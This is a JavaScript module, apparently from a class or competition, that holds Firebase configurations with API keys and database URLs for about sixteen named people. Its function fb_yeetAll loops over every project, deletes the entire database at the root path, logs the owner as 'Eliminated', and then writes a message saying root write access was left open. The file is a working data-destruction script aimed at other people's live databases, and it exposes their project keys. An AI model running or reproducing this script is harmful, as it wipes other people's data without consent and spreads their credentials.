import {
  ref,
  remove,
  getDatabase,
  set,
  get,
} from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";

const firebaseConfigs = [
  {
    name: "caleb",
    config: {
      apiKey: "AIzaSyCwPibZHntricqhOchcdlX3H7ve_CFQhR0",
      authDomain: "comp-2025-caleb-lowe-31f01.firebaseapp.com",
      databaseURL:
        "https://comp-2025-caleb-lowe-31f01-default-rtdb.firebaseio.com",
      projectId: "comp-2025-caleb-lowe-31f01",
      storageBucket: "comp-2025-caleb-lowe-31f01.firebasestorage.app",
      messagingSenderId: "440676386005",
      appId: "1:440676386005:web:05b4cb8a914c0ceb0ace5c",
      measurementId: "G-WGYBNEYVY3",
    },
  },
  {
    name: "kyla",
    config: {
      apiKey: "AIzaSyCn36qBrPRutqLXCYIyzkyjMQRiYyhRC2Q",
      authDomain: "comp-2025-kyla-van-weele.firebaseapp.com",
      databaseURL:
        "https://comp-2025-kyla-van-weele-default-rtdb.firebaseio.com",
      projectId: "comp-2025-kyla-van-weele",
      storageBucket: "comp-2025-kyla-van-weele.firebasestorage.app",
      messagingSenderId: "726085363137",
      appId: "1:726085363137:web:32da18f88b84bf19fffb40",
      measurementId: "G-RXDD9GFN2H",
    },
  },
  {
    name: "max",
    config: {
      apiKey: "AIzaSyCHDtQ5nuCxgp_XCL_RtR7YVHv8mO1rhmc",
      authDomain: "comp-2025-max-bergman-4bb13.firebaseapp.com",
      databaseURL:
        "https://comp-2025-max-bergman-4bb13-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-max-bergman-4bb13",
      storageBucket: "comp-2025-max-bergman-4bb13.firebasestorage.app",
      messagingSenderId: "75891205088",
      appId: "1:75891205088:web:9ce6dd10fe8f59fb6f8185",
      measurementId: "G-860HVWZ49V",
    },
  },
  {
    name: "joseph",
    config: {
      apiKey: "AIzaSyCtqOoxnHxsj7vs-AfrD8vo-20mA5Sq17A",
      authDomain: "comp-2025-joseph.firebaseapp.com",
      databaseURL:
        "https://comp-2025-joseph-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-joseph",
      storageBucket: "comp-2025-joseph.firebasestorage.app",
      messagingSenderId: "85501129840",
      appId: "1:85501129840:web:79c64e1947643f22bc70b5",
      measurementId: "G-BEE5KXTKTT",
    },
  },
  {
    name: "wilfred",
    config: {
      apiKey: "AIzaSyCwPcoDMGchHrJSuN_CWiQciiIJcnhYJVE",
      authDomain: "comp-2025-wilfred-leices-a7207.firebaseapp.com",
      databaseURL:
        "https://comp-2025-wilfred-leices-a7207-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-wilfred-leices-a7207",
      storageBucket: "comp-2025-wilfred-leices-a7207.firebasestorage.app",
      messagingSenderId: "155933616174",
      appId: "1:155933616174:web:78589529167648f04f97bf",
    },
  },
  {
    name: "scott",
    config: {
      apiKey: "AIzaSyBA9LF4VKTGLBynVTOiG3iJqm-odKKE74g",
      authDomain: "comp-2025-scott-barlow.firebaseapp.com",
      databaseURL:
        "https://comp-2025-scott-barlow-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-scott-barlow",
      storageBucket: "comp-2025-scott-barlow.firebasestorage.app",
      messagingSenderId: "604831891804",
      appId: "1:604831891804:web:e1d0c36b49a9ad732b4199",
      measurementId: "G-5JBDKMXH4C",
    },
  },
  {
    name: "madhulika",
    config: {
      apiKey: "AIzaSyAVR1PCSvRfuJtVBBaTOS_Q1l6M9Si0zwk",
      authDomain: "comp-2025-tirindi-madhulika.firebaseapp.com",
      databaseURL:
        "https://comp-2025-tirindi-madhulika-default-rtdb.firebaseio.com",
      projectId: "comp-2025-tirindi-madhulika",
      storageBucket: "comp-2025-tirindi-madhulika.firebasestorage.app",
      messagingSenderId: "492713596983",
      appId: "1:492713596983:web:1a462d99a51bd1cef607b2",
      measurementId: "G-RNYJ2GKKLL",
    },
  },
  {
    name: "william",
    config: {
      apiKey: "AIzaSyAQ4FYhhhVQvTWxBJstBPqUEM7k1z3HNCs",
      authDomain: "comp-2025-william-kan.firebaseapp.com",
      databaseURL: "https://comp-2025-william-kan-default-rtdb.firebaseio.com",
      projectId: "comp-2025-william-kan",
      storageBucket: "comp-2025-william-kan.firebasestorage.app",
      messagingSenderId: "928584832942",
      appId: "1:928584832942:web:caa21627c817d307485a3c",
      measurementId: "G-L6S6H3WPXE",
    },
  },
  {
    name: "carmen",
    config: {
      apiKey: "AIzaSyAC9lbREKwJJ95pZUJ7Wy3hI_QfivE2a34",
      authDomain: "comp-firebaseskills.firebaseapp.com",
      projectId: "comp-firebaseskills",
      storageBucket: "comp-firebaseskills.firebasestorage.app",
      messagingSenderId: "634491601796",
      appId: "1:634491601796:web:1c48be8af741f25bd353d1",
      databaseURL:
        "https://comp-firebaseskills-default-rtdb.asia-southeast1.firebasedatabase.app",
    },
  },
  {
    name: "dylan",
    config: {
      apiKey: "AIzaSyA8viBZ-gKBknRREyTiDinnugjj6Rjrog0",
      authDomain: "comp-2025-dylan-f.firebaseapp.com",
      databaseURL:
        "https://comp-2025-dylan-f-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-dylan-f",
      storageBucket: "comp-2025-dylan-f.firebasestorage.app",
      messagingSenderId: "133223974410",
      appId: "1:133223974410:web:d1cde3ac980749bde601f3",
      measurementId: "G-WHVZ7GW4CF",
    },
  },
  {
    name: "mio",
    config: {
      apiKey: "AIzaSyCd2Z_1nM5CI6l6NVOrvlN7EDbKEaSTiv0",
      authDomain: "comp-2025-mio-hoffman.firebaseapp.com",
      databaseURL: "https://comp-2025-mio-hoffman-default-rtdb.firebaseio.com",
      projectId: "comp-2025-mio-hoffman",
      storageBucket: "comp-2025-mio-hoffman.firebasestorage.app",
      messagingSenderId: "724400775542",
      appId: "1:724400775542:web:dccd0b43fb6bc612725a57",
      measurementId: "G-GYKCG77RCD",
    },
  },
  {
    name: "conor",
    config: {
      apiKey: "AIzaSyCCqhJW7S5L9nSkhlB_8Nvg3zzD4w65hjU",
      authDomain: "comp-conor-church.firebaseapp.com",
      databaseURL:
        "https://comp-conor-church-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-conor-church",
      storageBucket: "comp-conor-church.firebasestorage.app",
      messagingSenderId: "807950196532",
      appId: "1:807950196532:web:44538dd1b8184ee5760f61",
      measurementId: "G-G7Z4YR3HX7",
    },
  },
  {
    name: "britton",
    config: {
      apiKey: "AIzaSyAC9lbREKwJJ95pZUJ7Wy3hI_QfivE2a34",
      authDomain: "comp-firebaseskills.firebaseapp.com",
      databaseURL:
        "https://comp-firebaseskills-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-firebaseskills",
      storageBucket: "comp-firebaseskills.firebasestorage.app",
      messagingSenderId: "634491601796",
      appId: "1:634491601796:web:1c48be8af741f25bd353d1",
    },
  },
  {
    name: "ryan",
    config: {
      apiKey: "AIzaSyAQ3Qc6Ej_4YvNXCAjqsfLoA8p75j3R7-8",
      authDomain: "comp2025-ryan-parks.firebaseapp.com",
      databaseURL:
        "https://comp2025-ryan-parks-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp2025-ryan-parks",
      storageBucket: "comp2025-ryan-parks.firebasestorage.app",
      messagingSenderId: "73072219046",
      appId: "1:73072219046:web:7608445213a3fd3e973567",
      measurementId: "G-R89L1J8Z4D",
    },
  },
  {
    name: "idrees",
    config: {
      apiKey: "AIzaSyCkKH0pJ-Fo9axQNsBswxIwZyuruG1X6ts",
      authDomain: "comp-2025-idrees-munshi-24d0e.firebaseapp.com",
      databaseURL:
        "https://comp-2025-idrees-munshi-24d0e-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-idrees-munshi-24d0e",
      storageBucket: "comp-2025-idrees-munshi-24d0e.firebasestorage.app",
      messagingSenderId: "811934625308",
      appId: "1:811934625308:web:a1ff1ffffdcab01bcd79d9",
      measurementId: "G-7P3VZN9ZFD",
    },
  },
  {
    name: "joshua",
    config: {
      apiKey: "AIzaSyBNDhyKyF4h86o_xE3AY_e51-vB6gAUX1g",
      authDomain: "comp-2025-joshua-k-h.firebaseapp.com",
      databaseURL:
        "https://comp-2025-joshua-k-h-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "comp-2025-joshua-k-h",
      storageBucket: "comp-2025-joshua-k-h.firebasestorage.app",
      messagingSenderId: "695585659485",
      appId: "1:695585659485:web:a965ad296454cd022f0bb4",
      measurementId: "G-BZX0JJYC05",
    },
  },
];

function fb_yeetAll() {
  // Iterates over the list of configs getting the name + settings
  firebaseConfigs.forEach((currentConfig) => {
    // This intitialises the app with a name so we can have multiple
    let FB_CURRENTGAMEAPP = initializeApp(
      currentConfig.config,
      currentConfig.name
    );
    let FB_CURRENTGAMEDB = getDatabase(FB_CURRENTGAMEAPP);

    // This wipes the / path on the database, if
    // it succedes it writes a success message then breaks

    remove(ref(FB_CURRENTGAMEDB, "/"))
      .then(() => {
        console.log(`K.O OUT - ${currentConfig.name} Eliminated`);
        set(
          ref(FB_CURRENTGAMEDB, "/message"),
          `${currentConfig.name}, you have allowed writing to the root directory of firebase configs, turn this off`
        )
          .then(() => {
            console.info("Info message written to " + currentConfig.name);
          })
          .catch((error) => {
            console.log(
              `The hecker message failed to write for ${currentConfig.name} with the error: ${error}`
            );
          });
        
        return
      })
      .catch(() => {
        console.log(
          `Writing to the root directory of ${currentConfig.name} was insuccsessful. Attempting writing to all subdirectorys`
        );
      });
  });
}

export { fb_yeetAll }